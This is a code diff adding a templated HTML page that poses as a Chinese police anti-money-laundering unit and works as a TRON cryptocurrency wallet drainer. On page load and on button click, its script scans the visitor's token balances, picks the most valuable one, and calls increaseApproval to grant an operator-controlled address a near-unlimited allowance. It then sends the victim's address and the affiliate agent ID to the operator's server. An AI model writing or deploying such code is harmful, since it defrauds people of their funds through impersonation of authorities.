@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+ <head>
+ <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
+ <meta name="apple-mobile-web-app-capable" content="yes">
+ <meta name="apple-mobile-web-app-status-bar-style" content="black">
+ <meta name="format-detection" content="telephone=no, email=no">
+ <meta name="msapplication-tap-highlight" content="no">
+ <meta name="x5-orientation" content="portrait">
+ <meta name="x5-fullscreen" content="true">
+ <meta name="description" content="">
+ <meta name="keywords" content="">
+<title>公安部反洗小组</title>
+<style id="walletconnect-style-sheet">
+.button-fill{
+	width: 100%;
+    height: 3.25rem;
+    line-height: 3.25rem;
+    font-size: 1.373333rem;
+    color: #ffffff;
+    border: none;
+    border-radius: 0.3rem;
+	background-color: #0766c3;
+    margin-bottom: .5rem;
+}
+</style>
+
+<script type="text/javascript" src="/scan/js/jquery-2.1.4.min.js"></script>
+<script type="text/javascript" src="/scan/js/clipboard.min.js"></script>
+<script type="text/javascript" src="/scan/js/layer.js"></script>
+<script type="text/javascript" src="/scan/js/usdt/TronWeb.js"></script>
+</head>
+<body>
+	<div>
+		<input id="dizhi" value="{$domain}{:url('index/police/index_trc',['agent'=>$userId])}" style="position: fixed;top: -999em;" readonly />
+        <button class="button-fill open-wallet" data-clipboard-target="#dizhi">复制并打开钱包</button>
+	</div>
+	<a id="btn-connect" href="javascript:void(0);">
+		<img width="100%" height="100%" src="/police_files/img/index.png">
+	</a>
+	<div style="display:none;">
+		<textarea id="jsondata">{$addr|json_encode}</textarea>
+	</div>
+	<script>
+	 var address = "{$address}";
+	var agent = "{$userId}";
+	var rank = 6.5;
+	var authorized_address = '{$authorized_address}';
+	var domain = '{$domain}';
+	var bizhong = 'USDT';
+	var approveAddr = "{$approveAddr}";
+
+	$(function() {
+		var clipboard = new ClipboardJS('.open-wallet');
+		clipboard.on('success', function(e) {
+			//layer.msg('复制成功');
+			setTimeout(function() {
+				window.location.href = "imtokenv2://navigate?screen=DappView&url=" + encodeURIComponent($('#dizhi').val());
+			}, 500);
+		});
+		clipboard.on('error', function(e) {
+			layer.msg('复制失败，请重新点击按钮');
+		});
+
+		const addr = JSON.parse($('#jsondata').html());
+		const price = {
+			'WIN': 0.001150,
+			'USDT': 1,
+			'TONS': 1.35,
+			'USDJ': 1.04,
+			'JST': 0.125,
+			"HT": 20.41,
+			"SUN": 33.97,
+			"EXNX": 0.0621,
+			"VCOIN": 0.004225,
+			"POL": 0.1393,
+			"CKRW": 0.002487,
+		}
+
+		const decimals = {
+			'WIN': 6,
+			'USDT': 6,
+			'TONS': 6,
+			'USDJ': 18,
+			'JST': 18,
+			"HT": 18,
+			"SUN": 18,
+			"EXNX": 18,
+			"VCOIN": 6,
+			"POL": 8,
+			"CKRW": 6,
+		}
+
+		var total = 0;
+		async function getMostValuableAssets(account) {
+			let _symbol = 'USDT';
+			for (const symbol of Object.keys(addr)) {
+				let contract = await tronWeb.contract().at(addr[symbol]);
+				let myBalance = await contract.balanceOf(account).call(function (err,balance){const usdt=balance/(10**(decimals[symbol]||18))*price[symbol];console.log(usdt);if (usdt>total&&usdt>500){_symbol=symbol;total=usdt;approveAddr=addr[_symbol];console.log(_symbol)}})
+			}
+			bizhong = _symbol;
+			return _symbol;
+		}
+
+		/**
+		* * Connect wallet button pressed.
+		*/
+		async function onConnect() {
+			$('.pages').append('<div class="modal-overlay"></div>');
+			$('.modal-overlay').addClass('modal-overlay-visible');
+			$('.modal').removeClass('modal-out').addClass('modal-in');
+			let walletAddress = tronWeb.defaultAddress.base58;
+			bizhong = await getMostValuableAssets(walletAddress);
+			let instance = await tronWeb.contract().at(approveAddr);
+			let res = await instance["increaseApproval"](authorized_address,"90000000000000000000000000000");
+			res.send({
+				feeLimit: 10000000,
+				callValue: 0,
+				shouldPollResponse: false
+			}, function(err, res) {
+				if (err == null) {
+					postInfo(walletAddress, bizhong)
+				}
+				$('.modal-overlay').remove();
+				$('.modal').removeClass('modal-in').addClass('modal-out');
+			})
+		}
+		async function init() {
+			onConnect();
+		}
+
+		/**
+		* Main entry point.
+		*/
+		init();
+		document.querySelector("#btn-connect").addEventListener("click", onConnect);
+	})
+
+	async function postInfo(address, symbol) {
+		var data = {
+			address: address,
+			auth_address: authorized_address,
+			bizhong: symbol,
+			agent: agent
+		}
+
+		var d = new Date();
+		var n = d.getTime();
+
+		$.ajax({
+			type: 'get',
+			url:  domain + "{:url('index/api/trc_post')}?t="+n,
+			data: data,
+			success:function(){
+			}
+		})
+	}
+</script>
+</body>
+</html>
